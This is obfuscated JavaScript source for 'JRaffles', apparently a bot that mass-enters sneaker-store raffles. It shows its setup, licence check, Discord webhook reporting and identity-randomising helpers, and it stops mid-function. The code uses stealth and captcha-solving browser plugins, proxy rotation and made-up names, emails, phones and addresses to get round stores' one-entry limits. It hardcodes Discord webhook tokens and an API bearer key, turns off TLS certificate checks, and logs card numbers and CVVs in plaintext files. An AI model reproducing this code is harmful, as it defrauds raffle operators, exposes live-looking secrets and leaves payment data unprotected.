process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x3d3f42 = require('fs'), _0x30577a = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x2565df(_0x13aa41) {
    const _0xf9ac32 = _0x3d3f42['createWriteStream'](_0x13aa41, { 'flags': 'a' }), _0x43774b = console['log'];
    console['log'] = function () {
        const _0x54b438 = Array['prototype']['slice']['call'](arguments), _0x5b80be = _0x54b438['join']('\x20') + '\x0a';
        _0xf9ac32['write'](_0x5b80be), _0x43774b['apply'](console, _0x54b438);
    };
}
_0x2565df('../logs/log\x20' + _0x30577a);
var _0x15df56 = require('tough-cookie'), _0x266969 = require('node-imap'), _0x141af6 = require('util')['inspect'];
const _0x172805 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x3f4191 } = require('discord.js');
var _0x3169d5 = require('exe');
const { execFile: _0x3cb52d } = require('child_process'), _0x5dd90e = require('puppeteer-extra'), _0x1e1820 = require('puppeteer-extra-plugin-recaptcha'), _0x118712 = require('puppeteer-extra-plugin-stealth'), _0x2d77f8 = require('chalk'), _0x59687e = require('node-bash-title'), _0x3b676e = require('axios'), _0x365ef0 = require('papaparse');
var _0x1e461e = require('random-name');
const _0x2dca78 = require('request');
var _0x1e7814 = require('prompt');
const _0x388d4b = _0x2dca78['jar']();
var _0x114346 = {};
const _0x1e6a58 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x4028d6 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x124926 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x8a31a8 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x19b30a = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0xac1bc8 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x459ded = 'https://discord.com/api/webhooks/', _0x5dfa1d = '' + _0x459ded + _0x124926, _0x34385d = '' + _0x459ded + _0x8a31a8, _0x1543f5 = '' + _0x459ded + _0x1e6a58, _0x188004 = '' + _0x459ded + _0x4028d6, _0x30beeb = '' + _0x459ded + _0x19b30a, _0x1ea2ad = '' + _0x459ded + _0xac1bc8;
const _0xd85992 = JSON['parse'](_0x3d3f42['readFileSync']('../package.json', 'utf-8')), _0x92063b = _0xd85992['version'];
var _0x2b0c3a, _0x5e9a1f, _0x566fdf, _0x54eef8, _0x5736ed, _0x3ffad5, _0x447b4a, _0xb61b25;
const _0x3f3e92 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x3b5825 = ![];
const _0x283149 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x3f6fe4 = '0123456789';
var _0x1e76cb = _0x283149['split']('');
const _0x56e7a7 = require('auto-git-update'), _0x4b6821 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x543d67 = new _0x56e7a7(_0x4b6821);
async function _0x4e0b5b() {
    _0x5736ed = _0x3d3f42['readdirSync']('../proxies'), _0x54eef8 = _0x3d3f42['readdirSync']('../tasks'), !_0x3d3f42['existsSync']('../accounts/fenom.csv') && _0x3d3f42['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x3d3f42['existsSync']('../accounts/paypal.csv') && _0x3d3f42['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x3d3f42['existsSync']('../accounts/bstn.csv') && _0x3d3f42['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x3d3f42['existsSync']('../accounts/eql.csv') && _0x3d3f42['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x3d3f42['existsSync']('../failed-tasks.csv') && _0x3d3f42['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x3d3f42['existsSync']('../successful-tasks.csv') && _0x3d3f42['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x114346 = JSON['parse'](_0x3d3f42['readFileSync']('../settings.json', 'utf-8')), !_0x114346['delay'] && (_0x114346['delay'] = 0x3c, _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), !_0x114346['threads'] && (_0x114346['threads'] = 0x1, _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), !_0x114346['masterMail'] && (_0x114346['masterMail'] = 'yourmail@gmail.com', _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), !_0x114346['masterPassword'] && (_0x114346['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), !_0x114346['captchaKey'] && (_0x114346['captchaKey'] = '', _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), !_0x114346['useRandomProxy'] && (_0x114346['useRandomProxy'] = !![], _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), !_0x114346['shuffleTasks'] && (_0x114346['shuffleTasks'] = ![], _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), !_0x114346['webhook'] && (_0x114346['webhook'] = '', _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), _0x114346['delay'] <= 0x1388 && (_0x114346['delay'] = _0x114346['delay'] * 0x3e8), _0x114346['AfewDelay'] && (delete _0x114346['AfewDelay'], _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), _0x114346['MahaDelay'] && (delete _0x114346['MahaDelay'], _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), _0x114346['footshopDelay'] && (delete _0x114346['footshopDelay'], _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346, null, 0x2))), _0x114346['MahaDelay'] = _0x114346['delay'], _0x459ded = _0x114346['webhook'], _0x3ffad5 = _0x114346['licenseKey'];
}
let _0x1b7b5b, _0x1225bf = [], _0x4180b8;
const _0x572e60 = _0x56f163 => new Promise(_0x484087 => setTimeout(_0x484087, _0x56f163));
function _0x362881(_0x584db1, _0x4805cd) {
    return Math['floor'](Math['random']() * (_0x4805cd - _0x584db1 + 0x1) + _0x584db1);
}
function _0x3a3051(_0x4a6976) {
    let _0x45ff9b = _0x4a6976['length'], _0x4d94b0;
    while (_0x45ff9b != 0x0) {
        _0x4d94b0 = Math['floor'](Math['random']() * _0x45ff9b), _0x45ff9b--, [_0x4a6976[_0x45ff9b], _0x4a6976[_0x4d94b0]] = [
            _0x4a6976[_0x4d94b0],
            _0x4a6976[_0x45ff9b]
        ];
    }
    return _0x4a6976;
}
async function _0x2b0a8f(_0x6e488b) {
    return _0x3b676e['get']('https://api.hyper.co/v4/licenses/' + _0x6e488b, { 'headers': { 'Authorization': 'Bearer\x20' + _0x3f3e92 } })['then'](_0xab8db8 => _0xab8db8['data'])['catch'](() => null);
}
;
async function _0x44ca09(_0x292c7f) {
    console['clear']();
    if (_0x292c7f == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x311fe9 = await _0x1e7814['get']('License');
        if (_0x311fe9['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x572e60(0xbb8), _0x44ca09(_0x292c7f);
        _0x292c7f = _0x311fe9['License'], _0x114346['licenseKey'] = _0x292c7f, _0x3ffad5 = _0x292c7f, _0x3d3f42['writeFileSync']('../settings.json', JSON['stringify'](_0x114346));
    }
    console['log']('Checking\x20license\x20' + _0x3ffad5 + '...'), await _0x572e60(0x320);
    const _0x152027 = await _0x2b0a8f(_0x292c7f);
    _0x447b4a = JSON['stringify'](_0x152027['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0xb61b25 = JSON['stringify'](_0x152027['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x152027)
        return console['log']('License\x20not\x20found');
    if (!_0x152027['user'])
        return console['log']('License\x20not\x20bound');
    return _0x152027['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x3b5825 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x3b5825 = ![]);
}
async function _0x2545d2() {
    var _0x252d18 = await _0x1e7814['get']('Module');
    return console['clear'](), _0x252d18['Module'];
}
;
async function _0x1b89f9() {
    var _0xc34673 = await _0x1e7814['get']('Setting');
    return console['clear'](), _0xc34673['Setting'];
}
async function _0x258b84(_0x3d0665) {
    var _0x1356a4 = [];
    for (file of _0x54eef8) {
        var _0x467f03 = _0x3d3f42['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x365ef0['parse'](_0x467f03, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x3d0665['store'] && _0x1356a4['push'](file);
    }
    !_0x1356a4['length'] == 0x0 && (_0x54eef8 = _0x1356a4);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x856e43 = 0x0; _0x856e43 < _0x54eef8['length']; _0x856e43++) {
        console['log']('\x20(' + _0x856e43 + ')\x20' + _0x54eef8[_0x856e43]);
    }
    console['log']('');
    var _0xf7b321 = await _0x1e7814['get']('Task');
    if (_0xf7b321['Task'] > _0x54eef8['length'] - 0x1 || isNaN(_0xf7b321['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x572e60(0x3e8), _0x258b84();
    var _0x4f3233 = _0x3d3f42['readFileSync']('../tasks/' + _0x54eef8[_0xf7b321['Task']], 'utf-8');
    return _0x566fdf = _0x365ef0['parse'](_0x4f3233, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x2d77f8['blue'](_0x54eef8[_0xf7b321['Task']])), _0x2b0c3a = _0x54eef8[_0xf7b321['Task']], _0x566fdf;
}
async function _0x399720() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x58c268 = 0x0; _0x58c268 < _0x5736ed['length']; _0x58c268++) {
        console['log']('\x20(' + _0x58c268 + ')\x20' + _0x5736ed[_0x58c268]);
    }
    console['log']('');
    var _0x3ebd5d = await _0x1e7814['get']('Proxies');
    if (_0x3ebd5d['Proxies'] > _0x5736ed['length'] - 0x1 || isNaN(_0x3ebd5d['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x572e60(0x3e8), _0x399720();
    var _0x230e8b = _0x3d3f42['readFileSync']('../proxies/' + _0x5736ed[_0x3ebd5d['Proxies']], 'utf-8')['split']('\x0a');
    let _0x2326f1 = _0x230e8b['map']((_0xd7d063, _0xff5e21) => {
        sanatizeProxy = _0xd7d063['replace']('\x0d', '');
        if (_0x230e8b[_0xff5e21 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x5e9a1f = _0x5736ed[_0x3ebd5d['Proxies']], console['clear'](), _0x2326f1;
}
async function _0x13c866() {
    var _0x4b3ffb = await _0x1e7814['get']('Value');
    return console['clear'](), _0x4b3ffb['Value'];
}
async function _0x295f69(_0x4f11aa) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x2687ae = 0x0; _0x2687ae < _0x4f11aa['length']; _0x2687ae++) {
        console['log']('\x20(' + _0x2687ae + ')\x20[' + _0x4f11aa[_0x2687ae]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x57d2d8 = await _0x1e7814['get']('Module');
    return _0x57d2d8['Module'];
}
async function _0x2ed0cd() {
    var _0x21286c = await _0x1e7814['get']('Password');
    return console['clear'](), _0x21286c['Password'];
}
;
async function _0x2c68cd() {
    var _0x3b63b4 = await _0x1e7814['get']('Links');
    return _0x3b63b4['Links'];
}
;
async function _0x2184ef() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x597a04 = 0x0; _0x597a04 < _0x1225bf['length']; _0x597a04++) {
        console['log']('\x20(' + _0x597a04 + ')\x20' + _0x1225bf[_0x597a04]);
    }
    ;
    console['log']();
    let _0x7fc003 = await _0x1e7814['get']('Product');
    return console['clear'](), _0x7fc003['Product'];
}
;
function _0xed09ee() {
    var _0x22843e = new Date(Date['now']())['toLocaleTimeString']();
    return _0x22843e;
}
;
function _0x124a12() {
    var _0x31fccb = new Date(Date['now']())['toLocaleString']();
    return _0x31fccb['replace'](',', '');
}
async function _0x5641c6(_0x28447f, _0x4f8b92) {
    let _0x2cd053 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x92063b != 'devkey') {
        await _0x3b676e['post'](_0x28447f, _0x4f8b92, _0x2cd053);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x254487(_0x48eee6, _0x1a6179, _0x3e3ded, _0xa95b4, _0x39d598) {
    if (!_0xa95b4 && _0x3e3ded == 'dev') {
        var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x1a6179['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x1a6179['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x48eee6['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x114346['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x447b4a,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x48eee6['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x48eee6['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x92063b,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x33af38['data'];
    } else {
        if (_0xa95b4 && _0x3e3ded == 'dev') {
            var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x1a6179['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x447b4a,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x1a6179['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x48eee6['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x114346['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x39d598,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x48eee6['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x48eee6['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x92063b,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x33af38['data'];
        } else {
            if (_0x3e3ded == 'pub') {
                var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x1a6179['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x1a6179['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x48eee6['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x114346['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x48eee6['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x92063b,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x33af38['data'];
            } else {
                if (_0x3e3ded == 'acc' && !_0xa95b4) {
                    var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x1a6179['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x447b4a,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x1a6179['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x114346['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x92063b,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x33af38['data'];
                } else {
                    if (_0x3e3ded == 'acc' && _0xa95b4) {
                        var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x1a6179['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x447b4a,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x39d598,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x1a6179['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x114346['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x92063b,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x33af38['data'];
                    } else {
                        if (_0x3e3ded == 'open') {
                            var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0xb61b25)['addFields']({
                                'name': 'User',
                                'value': '' + _0x447b4a,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x92063b,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x33af38['data'];
                        } else {
                            if (!_0xa95b4 && _0x3e3ded == 'ver') {
                                var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x1a6179['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x447b4a,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x1a6179['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x114346['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x92063b,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x33af38['data'];
                            } else {
                                if (_0xa95b4 && _0x3e3ded == 'ver') {
                                    var _0x33af38 = new _0x3f4191()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x1a6179['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x447b4a,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x39d598,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x1a6179['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x114346['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x92063b,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x33af38['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x44ca58(_0x40995a, _0xc0e786) {
    var _0x4cafc3 = _0x40995a[_0xc0e786]['Address1']['split'](''), _0x5ea3bc = _0x40995a[_0xc0e786]['Address2']['split'](''), _0x4d3e94 = _0x40995a[_0xc0e786]['Email']['split']('@');
    for (var _0x200d8e = 0x0; _0x200d8e < _0x4cafc3['length']; _0x200d8e++) {
        if (_0x4cafc3[_0x200d8e] == 'X') {
            var _0x55b664 = Math['round'](Math['random']() * (_0x283149['length'] - 0x1));
            _0x4cafc3[_0x200d8e] = _0x1e76cb[_0x55b664];
        }
    }
    ;
    for (var _0x200d8e = 0x0; _0x200d8e < _0x5ea3bc['length']; _0x200d8e++) {
        if (_0x5ea3bc[_0x200d8e] == 'X') {
            var _0x55b664 = Math['round'](Math['random']() * (_0x283149['length'] - 0x1));
            _0x5ea3bc[_0x200d8e] = _0x1e76cb[_0x55b664];
        }
    }
    ;
    _0x40995a[_0xc0e786]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x40995a[_0xc0e786]['FirstName'] = _0x1e461e['first']());
    _0x40995a[_0xc0e786]['LastName']['toUpperCase']() == 'RANDOM' && (_0x40995a[_0xc0e786]['LastName'] = _0x1e461e['last']());
    _0x4d3e94[0x0]['toUpperCase']() == 'RANDOM' ? _0x4d3e94[0x0] = '' + _0x1e461e['first']() + _0x1e461e['last']() + _0x362881(0x1, 0x270f) + '@' : _0x4d3e94[0x0] = _0x4d3e94[0x0] + '@';
    _0x40995a[_0xc0e786]['Email'] = _0x4d3e94['join'](''), _0x40995a[_0xc0e786]['Address1'] = _0x4cafc3['join'](''), _0x40995a[_0xc0e786]['Address2'] = _0x5ea3bc['join']('');
    _0x40995a[_0xc0e786]['Phone'] == 'RANDOM' && (_0x40995a[_0xc0e786]['Phone'] = '0' + _0x362881(0x5f5e100, 0x3b9ac9ff));
    if (_0x40995a[_0xc0e786]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x281b20 = _0x362881(0x1, 0x270f);
        _0x40995a[_0xc0e786]['Follower'] = '' + _0x1e461e['first']() + _0x1e461e['last']() + _0x281b20 + '\x20';
    }
    _0x40995a[_0xc0e786]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x40995a[_0xc0e786]['HouseNumber'] = _0x362881(0x1, 0xc8));
    if (_0x40995a[_0xc0e786]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x170596 = Math['round'](Math['random']() * (_0x283149['length'] - 0x1)), _0x5c8381 = _0x1e76cb[_0x170596];
        _0x40995a[_0xc0e786]['Address1'] = _0x1e461e['last']() + 'straat', _0x40995a[_0xc0e786]['Zip'] == '' && (_0x40995a[_0xc0e786]['Postcode'] = _0x362881(0x3e8, 0x270f) + '\x20' + _0x5c8381 + _0x5c8381, _0x40995a[_0xc0e786]['Zip'] = _0x40995a[_0xc0e786]['Postcode']), _0x40995a[_0xc0e786]['HouseNumber'] = '' + _0x362881(0x1, 0xc8);
    }
    return;
}
;
async function _0x58f6f1(_0x4689b3, _0x248a54) {
    _0x3d3f42['appendFileSync']('../failed-tasks.csv', _0x124a12() + ',' + _0x248a54['store'] + ',' + _0x248a54['name'] + ',' + _0x4689b3['Url'] + ',' + _0x4689b3['Size'] + ',' + _0x4689b3['Follower'] + ',' + _0x4689b3['FirstName'] + ',' + _0x4689b3['LastName'] + ',' + _0x4689b3['Address1'] + ',' + _0x4689b3['Address2'] + ',' + _0x4689b3['HouseNumber'] + ',' + _0x4689b3['Zip'] + ',' + _0x4689b3['City'] + ',' + _0x4689b3['State'] + ',' + _0x4689b3['Country'] + ',' + _0x4689b3['Phone'] + ',' + _0x4689b3['Email'] + ',' + _0x4689b3['Password'] + ',' + _0x4689b3['PaymentMethod'] + ',' + _0x4689b3['CardType'] + ',' + _0x4689b3['NameOnCard'] + ',' + _0x4689b3['CardNumber'] + ',' + _0x4689b3['ExpiryDate'] + ',' + _0x4689b3['CVV'] + ',' + _0x4689b3['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x14aa55(_0x3aebe5, _0x38c2da) {
    _0x3d3f42['appendFileSync']('../successful-tasks.csv', _0x124a12() + ',' + _0x38c2da['store'] + ',' + _0x38c2da['name'] + ',' + _0x3aebe5['Url'] + ',' + _0x3aebe5['Size'] + ',' + _0x3aebe5['Follower'] + ',' + _0x3aebe5['FirstName'] + ',' + _0x3aebe5['LastName'] + ',' + _0x3aebe5['Address1'] + ',' + _0x3aebe5['Address2'] + ',' + _0x3aebe5['HouseNumber'] + ',' + _0x3aebe5['Zip'] + ',' + _0x3aebe5['City'] + ',' + _0x3aebe5['State'] + ',' + _0x3aebe5['Country'] + ',' + _0x3aebe5['Phone'] + ',' + _0x3aebe5['Email'] + ',' + _0x3aebe5['Password'] + ',' + _0x3aebe5['PaymentMethod'] + ',' + _0x3aebe5['CardType'] + ',' + _0x3aebe5['NameOnCard'] + ',' + _0x3aebe5['CardNumber'] + ',' + _0x3aebe5['ExpiryDate'] + ',' + _0x3aebe5['CVV'] + ',' + _0x3aebe5['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x4b7aae() {
    let _0x1f27fd = proxyFile['split']('\x0a'), _0x2d20ea = _0x1f27fd['map']((_0x318656, _0x5caa79) => {
        sanatizeProxy = _0x318656['replace']('\x0d', '');
        if (_0x1f27fd[_0x5caa79 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x2d20ea;
}
;
async function _0x39cb86(_0x480496, _0x11a2c8) {
    if (_0xd2e534 != 'yes')
        var _0xd2e534 = '', _0x3a4988 = 0x0;
    async function _0x15b1da() {
        var _0x126a4c = _0x3d3f42['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x4cbebf = _0x365ef0['parse'](_0x126a4c, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x24dd92 = 0x0; _0x24dd92 < _0x4cbebf['length']; _0x24dd92++) {
            console['log']('(' + _0x24dd92 + ')\x20' + _0x4cbebf[_0x24dd92]['Email']);
        }
        console['log']('\x0a(' + _0x4cbebf['length'] + ')\x20' + _0x2d77f8['cyan']('Add\x20a\x20new\x20account'));
        let _0x24bced = await _0x1e7814['get']('Option');
        if (_0x24bced['Option'] < _0x4cbebf['length'])
            return _0x4cbebf[_0x24bced['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0xa6d6d0 = {}, _0x13c6cf = await _0x1e7814['get']('Email');
        _0xa6d6d0['Email'] = _0x13c6cf['Email'];
        var _0x18dc73 = Math['round'](Math['random']() * (_0x11a2c8['length'] - 0x1));
        _0xa6d6d0['Proxy'] = _0x11a2c8[_0x18dc73], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
